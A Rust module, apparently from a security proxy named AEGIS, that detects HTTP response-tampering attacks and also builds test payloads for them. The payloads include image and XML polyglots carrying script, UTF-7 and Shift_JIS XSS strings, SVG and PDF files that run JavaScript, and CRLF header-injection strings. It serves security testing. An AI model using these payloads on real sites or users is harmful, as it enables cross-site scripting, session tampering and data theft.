/// Response tampering and content injection detection for the AEGIS proxy.
///
/// Covers eight attack classes:
///   1. Unencoded reflection (content injection)
///   2. MIME-type confusion
///   3. Content-sniffing polyglots
///   4. CRLF response splitting
///   5. Charset confusion (UTF-7, Shift_JIS, etc.)
///   6. SVG injection with embedded JS
///   7. PDF injection with embedded JS
///   8. Compressed response manipulation
use std::collections::HashMap;

// ---------------------------------------------------------------------------
// 1. Tampering pattern taxonomy
// ---------------------------------------------------------------------------

/// Categories of response-tampering attacks this module can detect/generate.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TamperingPattern {
    UnencodedReflection,
    MimeTypeConfusion,
    ContentSniffingPolyglot,
    CrlfResponseSplitting,
    CharsetConfusion,
    SvgInjection,
    PdfInjection,
    CompressedResponseManipulation,
}

impl std::fmt::Display for TamperingPattern {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnencodedReflection => write!(f, "Unencoded Reflection"),
            Self::MimeTypeConfusion => write!(f, "MIME Type Confusion"),
            Self::ContentSniffingPolyglot => write!(f, "Content Sniffing Polyglot"),
            Self::CrlfResponseSplitting => write!(f, "CRLF Response Splitting"),
            Self::CharsetConfusion => write!(f, "Charset Confusion"),
            Self::SvgInjection => write!(f, "SVG Injection"),
            Self::PdfInjection => write!(f, "PDF Injection"),
            Self::CompressedResponseManipulation => write!(f, "Compressed Response Manipulation"),
        }
    }
}

impl TamperingPattern {
    pub fn all() -> &'static [TamperingPattern] {
        &[
            Self::UnencodedReflection,
            Self::MimeTypeConfusion,
            Self::ContentSniffingPolyglot,
            Self::CrlfResponseSplitting,
            Self::CharsetConfusion,
            Self::SvgInjection,
            Self::PdfInjection,
            Self::CompressedResponseManipulation,
        ]
    }
}

// ---------------------------------------------------------------------------
// 2. Detection results
// ---------------------------------------------------------------------------

/// A single tampering finding discovered during analysis.
#[derive(Debug, Clone)]
pub struct TamperingFinding {
    pub pattern: TamperingPattern,
    pub description: String,
    pub evidence: String,
    pub severity: Severity,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

// ---------------------------------------------------------------------------
// 3. Response context — the raw HTTP material we inspect
// ---------------------------------------------------------------------------

/// Minimal representation of an HTTP response we want to analyse.
#[derive(Debug, Clone)]
pub struct ResponseContext {
    pub status_code: u16,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
    /// The original user-supplied input that was sent in the request.
    pub reflected_input: Option<String>,
}

impl ResponseContext {
    pub fn new(status_code: u16) -> Self {
        Self {
            status_code,
            headers: HashMap::new(),
            body: Vec::new(),
            reflected_input: None,
        }
    }

    pub fn with_header(mut self, key: &str, value: &str) -> Self {
        self.headers.insert(key.to_lowercase(), value.to_string());
        self
    }

    pub fn with_body(mut self, body: &[u8]) -> Self {
        self.body = body.to_vec();
        self
    }

    pub fn with_reflected_input(mut self, input: &str) -> Self {
        self.reflected_input = Some(input.to_string());
        self
    }

    fn body_as_str(&self) -> Option<&str> {
        std::str::from_utf8(&self.body).ok()
    }

    fn content_type(&self) -> Option<&str> {
        self.headers.get("content-type").map(|s| s.as_str())
    }

    fn content_encoding(&self) -> Option<&str> {
        self.headers.get("content-encoding").map(|s| s.as_str())
    }
}

// ---------------------------------------------------------------------------
// 4. The main detector
// ---------------------------------------------------------------------------

/// Top-level analyser. Feed it a `ResponseContext` and it returns every
/// tampering pattern it can detect.
pub struct ResponseTamperingDetector;

impl ResponseTamperingDetector {
    /// Run all detectors on the given response.
    pub fn analyse(ctx: &ResponseContext) -> Vec<TamperingFinding> {
        let mut findings = Vec::new();
        Self::detect_unencoded_reflection(ctx, &mut findings);
        Self::detect_mime_confusion(ctx, &mut findings);
        Self::detect_content_sniffing(ctx, &mut findings);
        Self::detect_crlf_splitting(ctx, &mut findings);
        Self::detect_charset_confusion(ctx, &mut findings);
        Self::detect_svg_injection(ctx, &mut findings);
        Self::detect_pdf_injection(ctx, &mut findings);
        Self::detect_compressed_manipulation(ctx, &mut findings);
        findings
    }

    // -- 1. Unencoded reflection ------------------------------------------------

    fn detect_unencoded_reflection(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let input = match ctx.reflected_input.as_deref() {
            Some(i) if !i.is_empty() => i,
            _ => return,
        };
        let body = match ctx.body_as_str() {
            Some(b) => b,
            None => return,
        };

        if body.contains(input) {
            let has_html_context =
                body.contains('<') && (body.contains("text/html") || body.contains("</"));
            let severity = if has_html_context {
                Severity::High
            } else {
                Severity::Medium
            };
            out.push(TamperingFinding {
                pattern: TamperingPattern::UnencodedReflection,
                description: "User input reflected in response without encoding".into(),
                evidence: format!("Input '{}' found verbatim in response body", input),
                severity,
            });
        }
    }

    // -- 2. MIME type confusion --------------------------------------------------

    fn detect_mime_confusion(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let ct = match ctx.content_type() {
            Some(c) => c,
            None => return,
        };
        let body = match ctx.body_as_str() {
            Some(b) => b,
            None => return,
        };

        let looks_like_html =
            body.contains("<!DOCTYPE") || body.contains("<html") || body.contains("<script");
        let ct_lower = ct.to_lowercase();
        let served_as_non_html = ct_lower.contains("text/plain")
            || ct_lower.contains("application/octet-stream")
            || ct_lower.contains("image/");

        if looks_like_html && served_as_non_html {
            out.push(TamperingFinding {
                pattern: TamperingPattern::MimeTypeConfusion,
                description: "HTML content served with non-HTML Content-Type".into(),
                evidence: format!("Body contains HTML markers but Content-Type is '{}'", ct),
                severity: Severity::High,
            });
        }

        let looks_like_js = body.starts_with("function ")
            || body.starts_with("var ")
            || body.starts_with("const ")
            || body.contains("alert(")
            || body.contains("eval(");
        let served_as_non_js = !ct_lower.contains("javascript") && !ct_lower.contains("json");

        if looks_like_js && served_as_non_js {
            out.push(TamperingFinding {
                pattern: TamperingPattern::MimeTypeConfusion,
                description: "JavaScript content served with non-JS Content-Type".into(),
                evidence: format!("Body looks like JavaScript but Content-Type is '{}'", ct),
                severity: Severity::High,
            });
        }
    }

    // -- 3. Content-sniffing polyglots ------------------------------------------

    fn detect_content_sniffing(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let no_sniff = ctx
            .headers
            .get("x-content-type-options")
            .map(|v| v.to_lowercase().contains("nosniff"))
            .unwrap_or(false);

        if no_sniff {
            return;
        }

        let body = &ctx.body;

        let gif_header = body.starts_with(b"GIF89a") || body.starts_with(b"GIF87a");
        let has_html = body.windows(6).any(|w| w == b"<html>" || w == b"<scrip");

        if gif_header && has_html {
            out.push(TamperingFinding {
                pattern: TamperingPattern::ContentSniffingPolyglot,
                description: "GIF+HTML polyglot detected — valid image with embedded HTML".into(),
                evidence: "Body starts with GIF magic bytes but also contains HTML tags".into(),
                severity: Severity::High,
            });
        }

        let png_header = body.starts_with(&[0x89, b'P', b'N', b'G']);
        let has_js = body.windows(6).any(|w| w == b"alert(" || w == b"eval(\"");

        if png_header && has_js {
            out.push(TamperingFinding {
                pattern: TamperingPattern::ContentSniffingPolyglot,
                description: "PNG+JS polyglot detected — valid image with embedded JavaScript"
                    .into(),
                evidence: "Body starts with PNG magic bytes but also contains JS function calls"
                    .into(),
                severity: Severity::High,
            });
        }

        let xml_header = body.starts_with(b"<?xml") || body.starts_with(b"<xml");
        if xml_header && has_html {
            out.push(TamperingFinding {
                pattern: TamperingPattern::ContentSniffingPolyglot,
                description: "XML+HTML polyglot detected — dual parseable content".into(),
                evidence: "Body starts as XML but contains HTML tags".into(),
                severity: Severity::Medium,
            });
        }
    }

    // -- 4. CRLF response splitting ---------------------------------------------

    fn detect_crlf_splitting(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        for (name, value) in &ctx.headers {
            if value.contains("\r\n") || value.contains("%0d%0a") || value.contains("%0D%0A") {
                out.push(TamperingFinding {
                    pattern: TamperingPattern::CrlfResponseSplitting,
                    description: "CRLF sequence in response header — potential response splitting"
                        .into(),
                    evidence: format!("Header '{}' contains CRLF bytes or encoding", name),
                    severity: Severity::Critical,
                });
            }
        }

        if let Some(body) = ctx.body_as_str()
            && body.contains("HTTP/1.")
            && body.contains("\r\n\r\n")
        {
            out.push(TamperingFinding {
                pattern: TamperingPattern::CrlfResponseSplitting,
                description: "Full HTTP response embedded in body — response splitting".into(),
                evidence: "Body contains HTTP status line followed by CRLF double-newline".into(),
                severity: Severity::Critical,
            });
        }
    }

    // -- 5. Charset confusion ---------------------------------------------------

    fn detect_charset_confusion(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let body = match ctx.body_as_str() {
            Some(b) => b,
            None => return,
        };
        let ct = ctx.content_type().unwrap_or("");

        let utf7_marker = body.contains("+ADw-") || body.contains("+ACIAPg-");
        if utf7_marker {
            out.push(TamperingFinding {
                pattern: TamperingPattern::CharsetConfusion,
                description: "UTF-7 encoded content detected — potential XSS via charset confusion"
                    .into(),
                evidence: "Body contains UTF-7 encoded angle brackets (+ADw-)".into(),
                severity: Severity::High,
            });
        }

        let shift_jis_escape = body.contains("\x1b$B") || body.contains("\x1b(J");
        if shift_jis_escape {
            out.push(TamperingFinding {
                pattern: TamperingPattern::CharsetConfusion,
                description: "Shift_JIS/ISO-2022-JP escape sequences in body".into(),
                evidence: "Body contains JIS escape codes that may confuse charset decoding".into(),
                severity: Severity::Medium,
            });
        }

        let header_says_utf8 = ct.to_lowercase().contains("utf-8");
        let body_lower = body.to_lowercase();
        let meta_tag_mismatch = body_lower.contains("charset=shift_jis")
            || body_lower.contains("charset=iso-2022-jp")
            || body_lower.contains("charset=utf-7")
            || body_lower.contains("charset=\"shift_jis\"")
            || body_lower.contains("charset=\"iso-2022-jp\"")
            || body_lower.contains("charset=\"utf-7\"");
        if header_says_utf8 && meta_tag_mismatch {
            out.push(TamperingFinding {
                pattern: TamperingPattern::CharsetConfusion,
                description:
                    "Charset mismatch between Content-Type header and HTML meta charset tag".into(),
                evidence: "Header declares UTF-8 but meta tag specifies a different encoding"
                    .into(),
                severity: Severity::High,
            });
        }
    }

    // -- 6. SVG injection -------------------------------------------------------

    fn detect_svg_injection(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let body = match ctx.body_as_str() {
            Some(b) => b,
            None => return,
        };

        let is_svg = body.contains("<svg") || {
            ctx.content_type()
                .map(|c| c.contains("image/svg"))
                .unwrap_or(false)
        };

        if !is_svg {
            return;
        }

        let has_script =
            body.contains("<script") || body.contains("onload=") || body.contains("onerror=");
        let has_foreign = body.contains("<foreignObject");
        let has_use_external = body.contains("<use") && body.contains("xlink:href");

        if has_script {
            out.push(TamperingFinding {
                pattern: TamperingPattern::SvgInjection,
                description: "SVG with embedded JavaScript execution".into(),
                evidence: "SVG body contains <script> tags or inline event handlers".into(),
                severity: Severity::Critical,
            });
        }
        if has_foreign {
            out.push(TamperingFinding {
                pattern: TamperingPattern::SvgInjection,
                description: "SVG with foreignObject — allows embedding arbitrary HTML".into(),
                evidence: "SVG body contains <foreignObject> element".into(),
                severity: Severity::High,
            });
        }
        if has_use_external {
            out.push(TamperingFinding {
                pattern: TamperingPattern::SvgInjection,
                description: "SVG with external reference via <use> — potential SSRF/XSS".into(),
                evidence: "SVG body contains <use xlink:href=...> referencing external resource"
                    .into(),
                severity: Severity::High,
            });
        }
    }

    // -- 7. PDF injection -------------------------------------------------------

    fn detect_pdf_injection(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let body = &ctx.body;
        if !body.starts_with(b"%PDF-") {
            return;
        }

        let body_str = String::from_utf8_lossy(body);

        if body_str.contains("/JavaScript") || body_str.contains("/JS ") {
            out.push(TamperingFinding {
                pattern: TamperingPattern::PdfInjection,
                description: "PDF with embedded JavaScript action".into(),
                evidence: "PDF body contains /JavaScript or /JS action references".into(),
                severity: Severity::Critical,
            });
        }

        if body_str.contains("/OpenAction") || body_str.contains("/AA ") {
            out.push(TamperingFinding {
                pattern: TamperingPattern::PdfInjection,
                description: "PDF with auto-execute action (OpenAction/AA)".into(),
                evidence: "PDF body contains /OpenAction or /AA triggers that run on document open"
                    .into(),
                severity: Severity::High,
            });
        }

        if body_str.contains("/URI ") || body_str.contains("/SubmitForm") {
            out.push(TamperingFinding {
                pattern: TamperingPattern::PdfInjection,
                description: "PDF with data exfiltration potential via URI/SubmitForm".into(),
                evidence: "PDF body contains /URI or /SubmitForm actions".into(),
                severity: Severity::Medium,
            });
        }
    }

    // -- 8. Compressed response manipulation ------------------------------------

    fn detect_compressed_manipulation(ctx: &ResponseContext, out: &mut Vec<TamperingFinding>) {
        let encoding = ctx.content_encoding().unwrap_or("");
        let body = &ctx.body;

        if encoding.contains("gzip") && !body.starts_with(&[0x1f, 0x8b]) {
            out.push(TamperingFinding {
                pattern: TamperingPattern::CompressedResponseManipulation,
                description:
                    "Content-Encoding says gzip but body lacks gzip magic bytes — potential manipulation"
                        .into(),
                evidence: "Header declares gzip but body does not start with 0x1f 0x8b".into(),
                severity: Severity::Medium,
            });
        }

        if encoding.contains("deflate") && body.starts_with(&[0x1f, 0x8b]) {
            out.push(TamperingFinding {
                pattern: TamperingPattern::CompressedResponseManipulation,
                description: "Content-Encoding mismatch: declares deflate but body is gzip".into(),
                evidence: "Header says deflate but body has gzip magic bytes".into(),
                severity: Severity::Medium,
            });
        }

        if encoding.is_empty() || encoding == "identity" {
            let gzip_body = body.starts_with(&[0x1f, 0x8b]);
            let zlib_body =
                body.len() >= 2 && body[0] == 0x78 && [0x01, 0x5e, 0x9c, 0xda].contains(&body[1]);
            if gzip_body || zlib_body {
                out.push(TamperingFinding {
                    pattern: TamperingPattern::CompressedResponseManipulation,
                    description:
                        "Body appears compressed but no Content-Encoding header — may bypass WAF"
                            .into(),
                    evidence:
                        "No Content-Encoding header but body starts with compression magic bytes"
                            .into(),
                    severity: Severity::Medium,
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// 5. Polyglot generators
// ---------------------------------------------------------------------------

/// Generates polyglot file payloads that are valid as multiple content types
/// simultaneously. Used for content-sniffing attacks.
pub struct PolyglotGenerator;

impl PolyglotGenerator {
    /// GIF89a header followed by HTML payload, valid as both image/gif and text/html.
    pub fn html_gif(js_payload: &str) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(b"GIF89a");
        // Minimal GIF header fields (logical screen descriptor)
        buf.extend_from_slice(&[0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00]);
        // Embed HTML after the GIF header — browsers that sniff will parse it
        buf.extend_from_slice(b"/*");
        buf.extend_from_slice(&[0x00, 0x2c, 0x00, 0x00, 0x00, 0x00]);
        buf.extend_from_slice(&[
            0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b,
        ]);
        buf.extend_from_slice(b"*/");
        buf.extend_from_slice(b"<html><script>");
        buf.extend_from_slice(js_payload.as_bytes());
        buf.extend_from_slice(b"</script></html>");
        buf
    }

    /// PNG magic bytes followed by JavaScript, valid as both image/png and
    /// application/javascript (in browsers that sniff).
    pub fn js_png(js_payload: &str) -> Vec<u8> {
        let mut buf = Vec::new();
        // PNG 8-byte signature
        buf.extend_from_slice(&[0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a]);
        // Minimal IHDR chunk (13-byte data)
        let ihdr_data: [u8; 13] = [
            0x00, 0x00, 0x00, 0x01, // width=1
            0x00, 0x00, 0x00, 0x01, // height=1
            0x08, 0x02, // bit depth=8, colour=RGB
            0x00, 0x00, 0x00, // compression, filter, interlace
        ];
        buf.extend_from_slice(&(ihdr_data.len() as u32).to_be_bytes());
        buf.extend_from_slice(b"IHDR");
        buf.extend_from_slice(&ihdr_data);
        buf.extend_from_slice(&[0x00; 4]); // CRC placeholder
                                           // Embed JS as a tEXt chunk (ancillary, safe to ignore by image decoders)
        let keyword = b"Comment\x00";
        let text_data_len = keyword.len() + js_payload.len();
        buf.extend_from_slice(&(text_data_len as u32).to_be_bytes());
        buf.extend_from_slice(b"tEXt");
        buf.extend_from_slice(keyword);
        buf.extend_from_slice(js_payload.as_bytes());
        buf.extend_from_slice(&[0x00; 4]); // CRC placeholder
                                           // IEND
        buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        buf.extend_from_slice(b"IEND");
        buf.extend_from_slice(&[0xae, 0x42, 0x60, 0x82]); // IEND CRC
        buf
    }

    /// XML prolog followed by HTML body. Parses as both application/xml and
    /// text/html depending on the parser.
    pub fn xml_html(js_payload: &str) -> Vec<u8> {
        let xml = format!(
            "<?xml version=\"1.0\"?>\n\
             <html xmlns=\"http://www.w3.org/1999/xhtml\">\n\
             <body>\n\
             <script>{}</script>\n\
             </body>\n\
             </html>",
            js_payload
        );
        xml.into_bytes()
    }

    /// Returns all available polyglot types with their payloads.
    pub fn all(js_payload: &str) -> Vec<(&'static str, Vec<u8>)> {
        vec![
            ("HTML+GIF", Self::html_gif(js_payload)),
            ("JS+PNG", Self::js_png(js_payload)),
            ("XML+HTML", Self::xml_html(js_payload)),
        ]
    }
}

// ---------------------------------------------------------------------------
// 6. Charset attack payloads
// ---------------------------------------------------------------------------

/// Generates encoding-confusion payloads that exploit charset handling differences.
pub struct CharsetAttackGenerator;

impl CharsetAttackGenerator {
    /// UTF-7 encoded `<script>alert(1)</script>`.
    pub fn utf7_script_tag() -> String {
        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string()
    }

    /// UTF-7 encoded `<img src=x onerror=alert(1)>`.
    pub fn utf7_img_onerror() -> String {
        "+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-".to_string()
    }

    /// Shift_JIS multi-byte sequence that eats the following quote character,
    /// breaking attribute context. The byte 0x82 begins a two-byte character in
    /// Shift_JIS and the ASCII quote becomes the trail byte.
    pub fn shift_jis_quote_eater() -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(b"\x82"); // lead byte of Shift_JIS char
        buf.extend_from_slice(b"\" onmouseover=alert(1) x=\"");
        buf
    }

    /// ISO-2022-JP escape sequence that switches the decoder to JIS X 0208,
    /// causing subsequent ASCII to be misinterpreted.
    pub fn iso2022jp_escape() -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(b"\x1b$B"); // switch to JIS X 0208
        buf.extend_from_slice(b"<script>alert(1)</script>");
        buf.extend_from_slice(b"\x1b(B"); // switch back to ASCII
        buf
    }

    /// BOM-based confusion: UTF-8 BOM + content declared as latin-1 in meta tag.
    pub fn bom_charset_mismatch() -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&[0xEF, 0xBB, 0xBF]); // UTF-8 BOM
        buf.extend_from_slice(
            b"<html><head><meta charset=\"iso-8859-1\"></head><body><script>alert(1)</script></body></html>",
        );
        buf
    }

    /// Returns all charset attack payloads.
    pub fn all() -> Vec<(&'static str, Vec<u8>)> {
        vec![
            ("UTF-7 script tag", Self::utf7_script_tag().into_bytes()),
            ("UTF-7 img onerror", Self::utf7_img_onerror().into_bytes()),
            ("Shift_JIS quote eater", Self::shift_jis_quote_eater()),
            ("ISO-2022-JP escape", Self::iso2022jp_escape()),
            ("BOM charset mismatch", Self::bom_charset_mismatch()),
        ]
    }
}

// ---------------------------------------------------------------------------
// 7. SVG payload generator
// ---------------------------------------------------------------------------

/// Generates SVG files with embedded JavaScript execution vectors.
pub struct SvgPayloadGenerator;

impl SvgPayloadGenerator {
    /// Minimal SVG with an embedded `<script>` block.
    pub fn script_tag(js_payload: &str) -> String {
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\">\n\
             <script type=\"text/javascript\">{}</script>\n\
             <rect width=\"100\" height=\"100\" fill=\"red\"/>\n\
             </svg>",
            js_payload
        )
    }

    /// SVG with `onload` event handler on the root element.
    pub fn onload_handler(js_payload: &str) -> String {
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"{}\">\n\
             <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"blue\"/>\n\
             </svg>",
            js_payload
        )
    }

    /// SVG with `<foreignObject>` embedding arbitrary HTML.
    pub fn foreign_object(html_payload: &str) -> String {
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\
             <foreignObject width=\"100%\" height=\"100%\">\n\
             <body xmlns=\"http://www.w3.org/1999/xhtml\">\n\
             {}\n\
             </body>\n\
             </foreignObject>\n\
             </svg>",
            html_payload
        )
    }

    /// SVG with `<use xlink:href>` referencing an external resource.
    pub fn external_use(external_url: &str) -> String {
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\
             <use xlink:href=\"{}#payload\"/>\n\
             </svg>",
            external_url
        )
    }

    /// SVG with `<animate>` tag that triggers JS via attribute manipulation.
    pub fn animate_xss(js_payload: &str) -> String {
        format!(
            "<svg xmlns=\"http://www.w3.org/2000/svg\">\n\
             <animate attributeName=\"href\" values=\"javascript:{}\"/>\n\
             <set attributeName=\"onmouseover\" to=\"{}\"/>\n\
             </svg>",
            js_payload, js_payload
        )
    }
}

// ---------------------------------------------------------------------------
// 8. PDF payload generator
// ---------------------------------------------------------------------------

/// Generates minimal PDF files with embedded JavaScript actions.
pub struct PdfPayloadGenerator;

impl PdfPayloadGenerator {
    /// Minimal PDF that executes JavaScript when opened.
    pub fn js_on_open(js_code: &str) -> Vec<u8> {
        let js_stream = format!("({js})", js = js_code);
        let pdf = format!(
            "%PDF-1.4\n\
             1 0 obj\n\
             << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\n\
             endobj\n\
             2 0 obj\n\
             << /Type /Pages /Kids [3 0 R] /Count 1 >>\n\
             endobj\n\
             3 0 obj\n\
             << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n\
             endobj\n\
             4 0 obj\n\
             << /Type /Action /S /JavaScript /JS {js_stream} >>\n\
             endobj\n\
             xref\n\
             0 5\n\
             trailer\n\
             << /Size 5 /Root 1 0 R >>\n\
             startxref\n\
             0\n\
             %%EOF",
            js_stream = js_stream
        );
        pdf.into_bytes()
    }

    /// PDF with a SubmitForm action that exfiltrates data to an external URL.
    pub fn submit_form(target_url: &str) -> Vec<u8> {
        let pdf = format!(
            "%PDF-1.4\n\
             1 0 obj\n\
             << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\n\
             endobj\n\
             2 0 obj\n\
             << /Type /Pages /Kids [3 0 R] /Count 1 >>\n\
             endobj\n\
             3 0 obj\n\
             << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n\
             endobj\n\
             4 0 obj\n\
             << /Type /Action /S /SubmitForm /F ({url}) /Flags 4 >>\n\
             endobj\n\
             xref\n\
             0 5\n\
             trailer\n\
             << /Size 5 /Root 1 0 R >>\n\
             startxref\n\
             0\n\
             %%EOF",
            url = target_url
        );
        pdf.into_bytes()
    }

    /// PDF with URI action that navigates to an attacker-controlled URL.
    pub fn uri_redirect(target_url: &str) -> Vec<u8> {
        let pdf = format!(
            "%PDF-1.4\n\
             1 0 obj\n\
             << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\n\
             endobj\n\
             2 0 obj\n\
             << /Type /Pages /Kids [3 0 R] /Count 1 >>\n\
             endobj\n\
             3 0 obj\n\
             << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n\
             endobj\n\
             4 0 obj\n\
             << /Type /Action /S /URI /URI ({url}) >>\n\
             endobj\n\
             xref\n\
             0 5\n\
             trailer\n\
             << /Size 5 /Root 1 0 R >>\n\
             startxref\n\
             0\n\
             %%EOF",
            url = target_url
        );
        pdf.into_bytes()
    }
}

// ---------------------------------------------------------------------------
// 9. CRLF payload generator
// ---------------------------------------------------------------------------

/// Generates CRLF injection payloads for response splitting attacks.
pub struct CrlfPayloadGenerator;

impl CrlfPayloadGenerator {
    /// Raw CRLF injection that adds a Set-Cookie header.
    pub fn header_injection_cookie(cookie_value: &str) -> String {
        format!("value\r\nSet-Cookie: session={}\r\n", cookie_value)
    }

    /// Full response split: terminates the first response and starts a new
    /// one with attacker-controlled body.
    pub fn full_response_split(html_body: &str) -> String {
        format!(
            "value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{}",
            html_body
        )
    }

    /// URL-encoded variant for applications that decode query params.
    pub fn url_encoded_split() -> String {
        "value%0d%0aX-Injected:%20true%0d%0a".to_string()
    }
}

#[cfg(test)]
#[path = "response_tampering_test.rs"]
mod response_tampering_test;
